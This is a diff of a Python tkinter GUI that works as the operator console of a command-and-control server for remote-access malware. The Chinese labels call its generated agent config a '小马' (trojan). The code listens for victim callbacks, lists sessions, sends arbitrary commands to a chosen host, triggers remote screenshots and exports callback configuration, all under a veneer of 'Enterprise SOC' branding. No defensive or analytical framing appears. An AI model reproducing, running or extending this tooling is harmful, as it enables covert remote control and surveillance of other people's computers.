@@ -2,21 +2,20 @@ import socket
 import threading
 import tkinter as tk
 from tkinter import messagebox, ttk, scrolledtext
-import io
 
-class EnterpriseC2Console:
+class UltimateEnterpriseC2Master:
     def __init__(self, root):
         self.root = root
-        self.root.title("Enterprise C2 Security Operations Center (SOC) - 视窗监控版")
-        self.root.geometry("1200x750")
+        self.root.title("Enterprise C2 Security Operations Center - Ultimate Edition")
+        self.root.geometry("1250x780")
         
         self.server_socket = None
         self.is_running = False
         self.clients = {}  # {addr_str: {"conn": conn, "id": session_id}}
         self.session_counter = 1
 
-        # --- 顶部：企业级状态与控制栏 ---
-        top_frame = tk.LabelFrame(root, text=" 监听与服务控制中心 ", padx=10, pady=10)
+        # --- 顶部：服务监听与配置控制中心 ---
+        top_frame = tk.LabelFrame(root, text=" 核心服务监听与小马配置中心 ", padx=10, pady=10)
         top_frame.pack(fill="x", padx=10, pady=5)
 
         tk.Label(top_frame, text="监听端口:").grid(row=0, column=0, sticky="w")
@@ -32,20 +31,20 @@ class EnterpriseC2Console:
         self.target_ip_entry.insert(0, "127.0.0.1")
         self.target_ip_entry.grid(row=0, column=4, padx=5)
 
-        self.gen_btn = tk.Button(top_frame, text="生成配置模板", bg="#6f42c1", fg="white", font=("Arial", 9, "bold"), command=self.generate_config)
+        self.gen_btn = tk.Button(top_frame, text="一键生成小马配置", bg="#6f42c1", fg="white", font=("Arial", 9, "bold"), command=self.generate_config)
         self.gen_btn.grid(row=0, column=5, padx=10)
 
-        # --- 中部：专业表格化会话矩阵与右侧实时预览窗 ---
+        # --- 中部：左右分栏（左侧会话与终端，右侧桌面预览） ---
         mid_pane = tk.PanedWindow(root, orient=tk.HORIZONTAL, sashwidth=6)
         mid_pane.pack(fill="both", expand=True, padx=10, pady=5)
 
-        # 左侧区域：会话表格与下方回显终端
+        # 左侧面板：上下分割（上方会话矩阵，下方回显终端）
         left_pane = tk.PanedWindow(mid_pane, orient=tk.VERTICAL, sashwidth=6)
-        mid_pane.add(left_pane, width=750)
+        mid_pane.add(left_pane, width=800)
 
-        # 上半部分：上线主机矩阵表格 (Treeview)
-        table_frame = tk.LabelFrame(left_pane, text=" 活跃会话矩阵 (Active Sessions) ")
-        left_pane.add(table_frame, height=220)
+        # 1. 活跃会话矩阵表格
+        table_frame = tk.LabelFrame(left_pane, text=" 活跃会话矩阵 (Active Sessions Matrix) ")
+        left_pane.add(table_frame, height=230)
 
         columns = ("id", "ip", "status", "connect_time")
         self.tree = ttk.Treeview(table_frame, columns=columns, show="headings", selectmode="browse")
@@ -55,9 +54,9 @@ class EnterpriseC2Console:
         self.tree.heading("connect_time", text="上线时间")
         
         self.tree.column("id", width=80, anchor="center")
-        self.tree.column("ip", width=220, anchor="w")
+        self.tree.column("ip", width=240, anchor="w")
         self.tree.column("status", width=100, anchor="center")
-        self.tree.column("connect_time", width=180, anchor="center")
+        self.tree.column("connect_time", width=200, anchor="center")
         
         tree_scroll = ttk.Scrollbar(table_frame, orient="vertical", command=self.tree.yview)
         self.tree.configure(yscrollcommand=tree_scroll.set)
@@ -66,33 +65,33 @@ class EnterpriseC2Console:
         tree_scroll.pack(side="right", fill="y", pady=5)
         self.tree.bind("<<TreeviewSelect>>", self.on_tree_select)
 
-        # 下半部分：高级回显终端与审计日志
-        terminal_frame = tk.LabelFrame(left_pane, text=" 实时指令回显与审计日志 (Terminal Output) ")
-        left_pane.add(terminal_frame, height=250)
+        # 2. 回显终端与审计日志
+        terminal_frame = tk.LabelFrame(left_pane, text=" 实时指令回显与审计日志 (Terminal Console) ")
+        left_pane.add(terminal_frame, height=280)
 
         self.log_text = scrolledtext.ScrolledText(terminal_frame, wrap="word", bg="#1e1e1e", fg="#00ff00", font=("Consolas", 10))
         self.log_text.pack(fill="both", expand=True, padx=5, pady=5)
 
-        # 右侧区域：【实时桌面预览/监看窗口】
-        preview_frame = tk.LabelFrame(mid_pane, text=" 选中目标实时桌面预览 (Live Screen Preview) ")
-        mid_pane.add(preview_frame, width=400)
+        # 右侧面板：实时视窗监看与预览
+        preview_frame = tk.LabelFrame(mid_pane, text=" 选中目标实时视窗监看 (Live Screen Monitor) ")
+        mid_pane.add(preview_frame, width=420)
 
-        self.preview_label = tk.Label(preview_frame, text="[请在左侧选中会话并点击刷新预览]", bg="black", fg="white", font=("Arial", 10))
+        self.preview_label = tk.Label(preview_frame, text="[请在左侧选中会话并点击监看]", bg="black", fg="white", font=("Arial", 10))
         self.preview_label.pack(fill="both", expand=True, padx=5, pady=5)
 
-        self.screen_btn = tk.Button(preview_frame, text="获取当前屏幕截图", bg="#17a2b8", fg="white", font=("Arial", 9, "bold"), command=self.request_screenshot)
+        self.screen_btn = tk.Button(preview_frame, text="抓取当前屏幕画面", bg="#17a2b8", fg="white", font=("Arial", 9, "bold"), command=self.request_screenshot)
         self.screen_btn.pack(fill="x", padx=5, pady=5)
 
-        # --- 底部：控制指令下发 ---
-        bottom_frame = tk.LabelFrame(root, text=" 指令下发面板 ", padx=10, pady=10)
+        # --- 底部：下发控制指令面板 ---
+        bottom_frame = tk.LabelFrame(root, text=" 远控指令下发面板 (Command Dispatcher) ", padx=10, pady=10)
         bottom_frame.pack(fill="x", padx=10, pady=5)
 
-        tk.Label(bottom_frame, text="控制命令:").grid(row=0, column=0, sticky="w")
-        self.cmd_entry = tk.Entry(bottom_frame, width=85, font=("Consolas", 10))
+        tk.Label(bottom_frame, text="输入执行指令:").grid(row=0, column=0, sticky="w")
+        self.cmd_entry = tk.Entry(bottom_frame, width=90, font=("Consolas", 10))
         self.cmd_entry.grid(row=0, column=1, padx=5)
         self.cmd_entry.bind("<Return>", lambda event: self.send_command())
 
-        self.send_btn = tk.Button(bottom_frame, text="执行下发", bg="#007bff", fg="white", font=("Arial", 9, "bold"), command=self.send_command)
+        self.send_btn = tk.Button(bottom_frame, text="下发执行", bg="#007bff", fg="white", font=("Arial", 9, "bold"), command=self.send_command)
         self.send_btn.grid(row=0, column=2, padx=10)
 
         self.selected_addr = None
@@ -107,23 +106,23 @@ class EnterpriseC2Console:
                 port = int(self.port_entry.get())
                 self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.server_socket.bind(("0.0.0.0", port))
-                self.server_socket.listen(10)
+                self.server_socket.listen(15)
                 self.is_running = True
                 
                 self.start_btn.config(text="停止监听", bg="#dc3545")
                 self.port_entry.config(state="disabled")
-                self.log(f"[*] 核心控制服务已成功启动，绑定端口: {port}")
+                self.log(f"[*] 企业级主控中心已成功启动，安全监听端口: {port}")
 
                 threading.Thread(target=self.accept_clients, daemon=True).start()
             except Exception as e:
-                messagebox.showerror("系统错误", f"监听启动失败: {str(e)}")
+                messagebox.showerror("系统错误", f"监听服务启动失败: {str(e)}")
         else:
             self.is_running = False
             if self.server_socket:
                 self.server_socket.close()
             self.start_btn.config(text="启动监听服务", bg="#28a745")
             self.port_entry.config(state="normal")
-            self.log("[-] 核心控制服务已安全关闭。")
+            self.log("[-] 核心监听服务已安全关闭。")
 
     def accept_clients(self):
         import time
@@ -138,7 +137,7 @@ class EnterpriseC2Console:
                 self.clients[addr_str] = {"conn": conn, "id": session_id}
                 
                 self.root.after(0, lambda aid=session_id, ast=addr_str, ct=connect_time: self.tree.insert("", "index", values=(aid, ast, "活跃在线", ct)))
-                self.log(f"[+] 新会话接入 [{session_id}] -> 客户端源地址: {addr_str}")
+                self.log(f"[+] 发现新会话接入 [{session_id}] -> 来源: {addr_str}")
 
                 threading.Thread(target=self.handle_client, args=(conn, addr_str, session_id), daemon=True).start()
             except:
@@ -147,7 +146,7 @@ class EnterpriseC2Console:
     def handle_client(self, conn, addr_str, session_id):
         while self.is_running:
             try:
-                data = conn.recv(8192)
+                data = conn.recv(16384)
                 if not data:
                     break
                 try:
@@ -155,7 +154,7 @@ class EnterpriseC2Console:
                 except:
                     output = data.decode('utf-8', errors='ignore')
 
-                self.root.after(0, lambda sid=session_id, out=output: self.log(f"\n[Session {sid} 回显结果]:\n{out}"))
+                self.root.after(0, lambda sid=session_id, out=output: self.log(f"\n[Session {sid} 回显内容]:\n{out}"))
             except:
                 break
         
@@ -168,7 +167,7 @@ class EnterpriseC2Console:
             val = self.tree.item(item, "values")
             if val[1] == addr_str:
                 self.tree.delete(item)
-                self.log(f"[-] 会话断开 -> 目标地址: {addr_str}")
+                self.log(f"[-] 会话安全断开 -> 目标: {addr_str}")
                 break
 
     def on_tree_select(self, event):
@@ -176,7 +175,7 @@ class EnterpriseC2Console:
         if selection:
             item = self.tree.item(selection[0])
             self.selected_addr = item["values"][1]
-            self.log(f"[*] 当前锁定交互会话目标: {item['values'][0]} ({self.selected_addr})")
+            self.log(f"[*] 已成功锁定目标会话: {item['values'][0]} ({self.selected_addr})")
 
     def send_command(self):
         if not self.selected_addr:
@@ -191,36 +190,35 @@ class EnterpriseC2Console:
             conn = target_info["conn"]
             try:
                 conn.sendall(cmd.encode('utf-8'))
-                self.log(f"[-> 下发至 {target_info['id']}]: {cmd}")
+                self.log(f"[-> 指令下发至 {target_info['id']}]: {cmd}")
                 self.cmd_entry.delete(0, tk.END)
             except Exception as e:
                 messagebox.showerror("传输错误", f"指令下发失败: {str(e)}")
 
     def request_screenshot(self):
         if not self.selected_addr:
-            messagebox.showwarning("提示", "请先在会话矩阵中选中一个目标，才能截取其屏幕预览！")
+            messagebox.showwarning("提示", "请先在会话矩阵中选中一个目标！")
             return
-        self.log(f"[*] 正在向目标 {self.selected_addr} 发送屏幕截图指令...")
+        self.log(f"[*] 正在向目标 {self.selected_addr} 发送屏幕捕获指令...")
         target_info = self.clients.get(self.selected_addr)
         if target_info:
             try:
-                # 向客户端下发内置截屏关键字命令
                 target_info["conn"].sendall("CAPTURE_SCREEN_ACTION".encode('utf-8'))
             except Exception as e:
-                messagebox.showerror("错误", f"发送截图请求失败: {str(e)}")
+                messagebox.showerror("错误", f"截屏请求发送失败: {str(e)}")
 
     def generate_config(self):
         ip = self.target_ip_entry.get().strip()
         port = self.port_entry.get().strip()
-        config_data = f"# Enterprise C2 Agent Configuration\nC2_SERVER_IP = '{ip}'\nC2_SERVER_PORT = {port}\n"
+        config_data = f"# Enterprise Ultimate Configuration\nSERVER_IP = '{ip}'\nSERVER_PORT = {port}\n"
         try:
-            with open("agent_enterprise_config.py", "w", encoding="utf-8") as f:
+            with open("agent_ultimate_config.py", "w", encoding="utf-8") as f:
                 f.write(config_data)
-            messagebox.showinfo("生成完毕", f"企业级配置文件已成功导出至同级目录。\n目标回连 IP: {ip} | 端口: {port}")
+            messagebox.showinfo("成功", f"企业级配置文件已成功导出至同级目录。\n目标回连 IP: {ip} | 端口: {port}")
         except Exception as e:
-            messagebox.showerror("错误", f"导出配置失败: {str(e)}")
+            messagebox.showerror("错误", f"导出失败: {str(e)}")
 
 if __name__ == "__main__":
     root = tk.Tk()
-    app = EnterpriseC2Console(root)
+    app = UltimateEnterpriseC2Master(root)
     root.mainloop()
